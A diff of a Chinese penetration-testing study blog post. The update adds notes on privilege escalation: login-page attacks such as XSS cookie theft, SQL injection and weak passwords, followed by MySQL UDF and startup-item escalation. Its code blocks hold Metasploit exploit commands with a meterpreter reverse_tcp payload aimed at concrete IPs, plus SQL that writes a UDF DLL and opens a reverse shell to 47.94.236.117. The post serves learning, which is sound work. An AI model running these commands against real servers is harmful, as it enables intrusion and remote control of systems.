@@ -7,12 +7,12 @@
   
   <title>学习思考 | blog小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="基础入门  Web 应用 Web 架构 web 架构相关内容 反弹 shell   信息打点  业务资产 WEB 单域名 WEB 子域名 Web 架构资产 源码泄露 JS 架构 端口 &amp; 蜜罐 &amp; WAF CDN 绕过">
+  <meta name="description" content="基础入门  Web 应用 Web 架构 web 架构相关内容 反弹 shell   信息打点  业务资产 WEB 单域名 WEB 子域名 Web 架构资产 源码泄露 JS 架构 端口 &amp; 蜜罐 &amp; WAF CDN 绕过   提权  后台权限 数据库权限  mysql 提权 MSSQ 提权">
 <meta property="og:type" content="article">
 <meta property="og:title" content="学习思考">
-<meta property="og:url" content="https://my011215.github.io/2023/07/28/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/index.html">
+<meta property="og:url" content="https://my011215.github.io/2023/08/12/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/index.html">
 <meta property="og:site_name" content="blog小窝">
-<meta property="og:description" content="基础入门  Web 应用 Web 架构 web 架构相关内容 反弹 shell   信息打点  业务资产 WEB 单域名 WEB 子域名 Web 架构资产 源码泄露 JS 架构 端口 &amp; 蜜罐 &amp; WAF CDN 绕过">
+<meta property="og:description" content="基础入门  Web 应用 Web 架构 web 架构相关内容 反弹 shell   信息打点  业务资产 WEB 单域名 WEB 子域名 Web 架构资产 源码泄露 JS 架构 端口 &amp; 蜜罐 &amp; WAF CDN 绕过   提权  后台权限 数据库权限  mysql 提权 MSSQ 提权">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/390.png?raw=true">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/391.png?raw=true">
@@ -21,8 +21,8 @@
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/394.png?raw=true">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/395.png?raw=true">
 <meta property="og:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/394.png?raw=true">
-<meta property="article:published_time" content="2023-07-28T03:12:30.000Z">
-<meta property="article:modified_time" content="2023-07-28T14:32:59.517Z">
+<meta property="article:published_time" content="2023-08-12T03:12:30.000Z">
+<meta property="article:modified_time" content="2023-08-12T05:43:18.265Z">
 <meta property="article:author" content="草莓布丁">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://github.com/my011215/my011215.github.io/blob/main/image/390.png?raw=true">
@@ -82,8 +82,8 @@
       <div class="outer">
         <section id="main"><article id="post-Penetration testing/学习思考" class="article article-type-post" itemscope itemprop="blogPost"> 
 <div class="article-meta">
-    <a href="/2023/07/28/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/" class="article-date">
-  <time datetime="2023-07-28T03:12:30.000Z" itemprop="datePublished">2023-07-28</time>
+    <a href="/2023/08/12/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/" class="article-date">
+  <time datetime="2023-08-12T03:12:30.000Z" itemprop="datePublished">2023-08-12</time>
 </a>
 
 
@@ -128,6 +128,17 @@
 <li><a href="#js%E6%9E%B6%E6%9E%84">JS 架构</a></li>
 <li><a href="#%E7%AB%AF%E5%8F%A3%E8%9C%9C%E7%BD%90waf">端口 &amp; 蜜罐 &amp; WAF</a></li>
 <li><a href="#cdn%E7%BB%95%E8%BF%87">CDN 绕过</a></li>
+</ul>
+</li>
+<li><a href="#%E6%8F%90%E6%9D%83">提权</a>
+<ul>
+<li><a href="#%E5%90%8E%E5%8F%B0%E6%9D%83%E9%99%90">后台权限</a></li>
+<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9D%83%E9%99%90">数据库权限</a>
+<ul>
+<li><a href="#mysql%E6%8F%90%E6%9D%83">mysql 提权</a></li>
+<li><a href="#mssq%E6%8F%90%E6%9D%83">MSSQ 提权</a></li>
+</ul>
+</li>
 </ul>
 </li>
 </ul>
@@ -825,11 +836,177 @@ Web.xml</p>
  ddos 流量耗尽</p>
 </li>
 </ul>
+<h2><span id="提权"> 提权</span></h2>
+<p>感觉提权大致可以分为这样几个阶段<br>
+后台权限–&gt; 网站权限–&gt; 数据库权限–&gt; 系统权限–&gt; 域控权限</p>
+<ul>
+<li>
+<p>后台权限<br>
+可以根据登录框相关漏洞进入后台</p>
+</li>
+<li>
+<p>网站权限<br>
+一般为有文件上传，命令或代码执行、反序列化等漏洞可以直接上传 shell 连接网站获取网站权限</p>
+</li>
+<li>
+<p>数据库权限<br>
+在获取网站权限或者 sql 注入，信息泄露等情况下，连接数据库获取数据库权限</p>
+</li>
+<li>
+<p>系统权限<br>
+由网站权限或者或者数据库漏洞或者利用 RCE 反弹 shell 等高危漏洞直接获取系统（服务器）权限，这里系统还得看具体是 windows 还是 linux 不同用户权限也不一样，根据具体的系统权限和操作系统版本可以利用系统高危漏洞进行攻击，造成服务器瘫痪或者进一步后渗透获取域控权限。</p>
+</li>
+</ul>
+<ol>
+<li>
+<p>Linux：<br>
+管理员 UID 为 0：系统的管理员用户。<br>
+系统用户 UID 为 1～999：Linux 系统为了避免因某个服务程序出现漏洞而被黑客提权至整台服务器<br>
+默认服务程序会由独立的系统用户负责运行，进而有效控制被破坏范围。<br>
+普通用户 UID 从 1000 开始：是由管理员创建的用于日常工作的用户。</p>
+</li>
+<li>
+<p>Windows：<br>
+用户及组：system administrator user guest 等</p>
+</li>
+</ol>
+<ul>
+<li>
+<p>域控权限<br>
+高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等<br>
+可以理解为操作自己的虚拟机</p>
+</li>
+<li>
+<p>接口权限<br>
+后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取）<br>
+结合接口未授权和一些命令执行等漏洞可以进一步提权</p>
+</li>
+</ul>
+<h3><span id="后台权限"> 后台权限</span></h3>
+<p>登录框相关漏洞</p>
+<ol>
+<li>
+<p>信息泄露<br>
+ kyan 访问 host 路由可以获取登录用户名和密码。<br>
+源码泄露，查看 JS 代码等可能会残留用户名和密码<br>
+报错信息泄露存在用户名</p>
+</li>
+<li>
+<p>默认产品密码<br>
+部署上线人员未更改默认产品密码可以使用默认的直接登录。（panabit 网关登录）</p>
+</li>
+<li>
+<p>xss 漏洞<br>
+可能存在反射型 xss 或者存储型 xss，两者利用不同，第一种需要结合社工发送给用户登录进而从 xss 平台获取 cookie，第二种存入数据库，只要有用户登录我就可以直接获取用户 cookie 进而登录。（Citrix ADC and Citrix Gateway CVE-2023-24488 跨站脚本漏洞）</p>
+</li>
+<li>
+<p>sql 注入<br>
+万能密码（用友畅捷通 GNRemote.dll SQL 注入漏洞）、各种注入类型爆出用户名和密码进行登录。</p>
+</li>
+<li>
+<p>结合未授权漏洞<br>
+ smartbi 对接口未授权访问同时结合逻辑漏洞，先获取 token 发送到服务器，然后根据 token 获取正确 session 即可登录。</p>
+</li>
+<li>
+<p>登录逻辑漏洞</p>
+</li>
+</ol>
+<ul>
+<li>
+<p>密码可以爆破<br>
+主要是回显值不同可以控制账号不变，根据密码进行字典爆破从，从而根据包的大小进行爆破。</p>
+</li>
+<li>
+<p>验证码容易绕过<br>
+有规律的验证码，或者验证码可以根据某个接口每次提前获取，验证码未失效或者销毁不及时</p>
+</li>
+<li>
+<p>登录逻辑有缺陷<br>
+安恒明御防火墙访问特定接口后访问登录界面可以以管理员身份成功登录 24h</p>
+</li>
+<li>
+<p>弱密码<br>
+比如 admin/123456</p>
+</li>
+<li>
+<p>任意用户注册登录<br>
+对填写手机号邮箱未作识别等</p>
+</li>
+<li>
+<p>越权<br>
+密码重置链接可以预测未鉴权可以修改后登录</p>
+</li>
+<li>
+<p>任意用户密码修改<br>
+奇安信网神 SecSSL VPN 任意用户密码修改漏洞<br>
+修改密码后进行登录</p>
+</li>
+</ul>
+<ol start="7">
+<li>跨站请求伪造<br>
+同源策略未正确匹配，用户识别不清，在同一个浏览器之前登陆过该网站后点击可以自动携带 cookie 进入对应的网站，攻击者也可以获取 cookie。</li>
+</ol>
+<h3><span id="数据库权限"> 数据库权限</span></h3>
+<h4><span id="mysql-提权"> mysql 提权</span></h4>
+<ol>
+<li>提权条件</li>
+</ol>
+<ul>
+<li>
+<p>数据库帐号密码获取方式<br>
+ sqll 注入爆出连接用户名和密码<br>
+信息泄露，备份文件， 网站配置文件查看</p>
+</li>
+<li>
+<p>数据库的最高权限用户的密码<br>
+使其能够连接数据库，可以先通过网站内联数据库，再通过新增超级用户来外联</p>
+</li>
+<li>
+<p>secure-file-priv 没进行目录限制<br>
+如果为空，不做目录限制，即任何目录均可以。<br>
+如果指定了目录，MySQL 会限制只能从该目录导入、或导出到该目录。目录必须已存在，MySQL 不会自动创建该目录。<br>
+如果设置为 NULL，MySQL 服务器禁止导入与导出功能。</p>
+</li>
+</ul>
+<ol start="2">
+<li>UDF 提权<br>
+（1）MSF 自动化提权</li>
+</ol>
+<ul>
+<li>
+<p>密码成功连接数据库</p>
+</li>
+<li>
+<p>外联权限</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;帐号&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;密码&#x27; WITH GRANT OPTION;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>查看是否存在目录（高版本则自己创建目录）<br>
+mysql&lt;5.2 导出目录 c:/windows 或 system32<br>
+mysql=&gt;5.2 导出安装目录 /lib/plugin/</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select version();</span><br></pre></td></tr></table></figure>
+<p>使用 MSF 中的 exploit/multi/mysql/mysql_udf_payload 模块可以进行 UDF 提权<br>
+ MSF 会将 dll 文件写入 lib\plugin\ 目录下 (前提是该目录存在，需手工创建), 该 dll 文件中包含 sys_exec () 和 sys_eval () 两个函数，但是默认只创建 sys_exec () 函数，该函数执行并不会有回显。我们可以手动创建 sys_eval () 函数，来执行有回显的命令。<br>
+rport 默认 3306</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/mysql/mysql_udf_payload</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set password root</span><br><span class="line">set rhosts 47.102.195.100</span><br><span class="line">set rport 3386</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>连接数据库进行命令执行（提权到系统）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func where name = &quot;sys_exec&quot;; //查看</span><br><span class="line">create function sys_eval returns string soname &quot;WqkerHcA.dll &quot;;//创建函数绑定dll</span><br><span class="line">select sys_eval (&quot;whoami&quot;);//调用函数进行命令执行</span><br></pre></td></tr></table></figure>
+<p>（2）手动反弹 shell<br>
+ 参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43801718/article/details/105493042">https://blog.csdn.net/weixin_43801718/article/details/105493042</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">set @a=concat(&#x27;&#x27;,</span><br><span class="line">create table Ghost(data LONGBLOB);</span><br><span class="line">insert into Ghost values(&quot;&quot;);update Ghost set data = @a;</span><br><span class="line">select data from Ghost into DUMPFILE &#x27;C:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&#x27;;</span><br><span class="line">create function backshell returns string soname &#x27;udf.dll&#x27;;</span><br><span class="line">select backshell(&#x27;47.94.236.117&#x27;,7788)</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>启动项提权<br>
+ msf</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_start_up</span><br><span class="line">set rhosts 47.102.195.100</span><br><span class="line">set username root</span><br><span class="line">set password root</span><br><span class="line">run</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4><span id="mssq-提权"> MSSQ 提权</span></h4>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://my011215.github.io/2023/07/28/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/" data-id="cli2xd5rx0000g8tn92wf64l6" class="article-share-link">Share</a>
+      <a data-url="https://my011215.github.io/2023/08/12/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/" data-id="cli2xd5rx0000g8tn92wf64l6" class="article-share-link">Share</a>
       
       
     </footer>
@@ -873,7 +1050,7 @@ Web.xml</p>
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a><span class="archive-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -886,7 +1063,7 @@ Web.xml</p>
       <ul>
         
           <li>
-            <a href="/2023/07/28/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/">学习思考</a>
+            <a href="/2023/08/12/Penetration%20testing/%E5%AD%A6%E4%B9%A0%E6%80%9D%E8%80%83/">学习思考</a>
           </li>
         
           <li>
